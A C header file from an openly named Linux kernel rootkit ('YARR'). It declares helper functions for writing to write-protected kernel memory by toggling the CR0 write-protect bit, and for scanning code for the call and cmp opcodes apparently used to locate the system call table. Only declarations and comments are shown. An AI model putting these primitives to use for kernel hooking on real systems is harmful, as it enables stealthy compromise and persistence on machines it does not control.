/*
 *  YARR - Yet Another Repetitive Rootkit
 *  Copyright (C) 2011 Ole 
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 1, or (at your option)
 *  any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the 
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
 */

#ifndef __YARR_WE_NEED_SOME_USEFUL_FUNCTIONS
#define __YARR_WE_NEED_SOME_USEFUL_FUNCTIONS

/***
 * Writes len bytes of data pointed by orig to the memory area pointed by dst.
 *
 * This is just a wrapper for memcpy(), the reason to use it is that there are
 * some areas on kernel memory that are read-only due to the WP (Write-Protect)
 * bit of the Intel architecture on the CRX (Control Register X). This function
 * checks that bit and, if needed, disable it then writes and then enables it
 * again.
 *
 * If you want to write to kernel memory you should use it.
 *
 * @dst: The address where we will write.
 * @orig: The address where we take the data.
 * @len: The amount of bytes to be written.
 * @return: A pointer to dst.
 */
void *kmemcpy(void *dst, void *orig, size_t len);

/***
 * Searchs for the call opcode inside code and returns the address where it was
 * found.
 *
 * Use with care, this function has an intentional infinite loop, if you give
 * it a memory map that is circular and has no call opcode at all... this will
 * not be the case with the whole RAM, there will be lots of calls.
 *
 * Actually it doesn't searchs de call opcode, it searchs for the instruction
 * call <addr>(,%eax,4).
 *
 * @code: The address where we will start searching.
 * @return: The address where the call instruction was found, pointing to the
 *          first byte of it.
 */
void *search_call_opcode(void *code);

/***
 * Searchs for the opcode of the cmp intel instruction with immediate value
 * greater than 0x7f. To be more precise it search for the instruction
 * "cmpl $value, %eax" with value greater than 0x7f. The opcode for the this
 * instruction is \x3d\x??\x??\x??\x?? but with value equal or less than 0x7f
 * it is \x83\xf8\x??.
 *
 * @code: The address where we will start searching.
 * @return: The address where the cmp instruction was found, pointing  to the
 *          first byte of it.
 */
void *search_cmpl_opcode(void *code);

#endif /* __YARR_WE_NEED_SOME_USEFUL_FUNCTIONS. */

